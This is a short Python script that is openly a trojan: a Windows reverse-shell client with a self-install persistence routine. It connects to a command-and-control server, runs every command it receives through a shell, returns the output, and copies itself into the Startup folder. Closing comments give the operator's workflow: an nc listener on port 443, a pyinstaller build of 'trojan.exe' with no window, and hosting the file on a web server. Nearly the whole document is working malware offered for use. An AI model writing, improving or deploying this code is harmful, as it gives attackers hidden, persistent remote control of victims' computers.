import socket
import subprocess
import threading
import time
import os

# THE IP ADDRESS OF MY SERVER BELOW
CCIP = "127.0.0.1"
CCPORT = 443

def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\Microsoft\\Windows\\Start Menu\\Program\\Startup\"".format(exe_file))

def conn(CCIP, CCPORT):
    try:

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        # WE ARE SENDING FROM THE CLIENT TO THE SERVER
        client.send(output + b"\n")
    except Exception as error:
        print(error)


# WE ARE CREATING A CONN FROM THE CLIENT
def cli(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            # WE ARE GOING TO COMPARE DATA
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client,data)).start()

    except Exception as error:
        client.close()

        print(error)

if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)

        else:
            time.sleep(3)


# GO TO linux
# nc -lvp 443
#pyinstaller -F --clean -w trojan.py
# sudo cp trojan.exe /var/ww/html